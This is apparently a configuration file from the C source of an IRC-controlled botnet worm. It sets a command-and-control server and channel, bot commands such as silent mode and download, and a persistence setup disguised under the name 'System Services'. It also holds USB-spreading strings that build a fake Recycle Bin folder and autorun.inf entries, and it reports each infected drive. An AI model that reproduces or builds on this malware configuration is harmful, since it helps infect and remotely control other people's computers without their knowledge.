#include "externs.h"

ircconnect_s ircconnect[] =
{
	{"1.1.1.1", 81, ""},
	{0, 0, 0}
};

char infochan[] = "##";

unsigned long cfg_reconnectsleep = 5000; // msec
unsigned long cfg_ircmaxwaittime = 600; // sec
//irc
char cfg_ircchannel[] = "##";
char cfg_irchost[] = "";
char cfg_ircchanpass[] = "";
char cfg_ircorderprefix[] = "!";

char cfg_filename[] = "filename.exe";
//install
char cfg_mutex[] = "C3GGF30CX24F";
char cfg_firewall_description[] = "System Services";
char gotopth[] = "C:\\Windows\\";
char szRegname[] =  "System Services";

//commands   
char cmd_silent[]     = "sa"; 	  	  
char cmd_join[]       = "j";
char cmd_part[]       = "p";
char cmd_download[]   = "get";     

/* USB SHIT */
char USB_STR_RECYCLER[]	     = "\\RECYCLER";
char USB_STR_REC_SUBDIR[]	     = "\\S-1-6-21-2434476501-1644491937-600003330-1213";
char USB_STR_DESKTOP_DATA[]	 = "[.ShellClassInfo]\r\nCLSID={645FF040-5081-101B-9F08-00AA002F954E}";
char USB_STR_DESKTOP_INI[]	 = "\\Desktop.ini";
char USB_STR_AUTORUN_INF[]	 = "\\autorun.inf";
char USB_STR_AUTORUN_DATA1[] = "[autorun]\r\nopen=";
char USB_STR_AUTORUN_DATA2[] = "\r\nicon=%SystemRoot%\\system32\\SHELL32.dll,4\r\naction=Open folder to view files\r\nshell\\open=Open\r\nshell\\open\\command=";
char USB_STR_AUTORUN_DATA3[] = "\r\nshell\\open\\default=1";
char USB_STR_INFECTED[]      = ".:[USB]:. Infected Drive ";
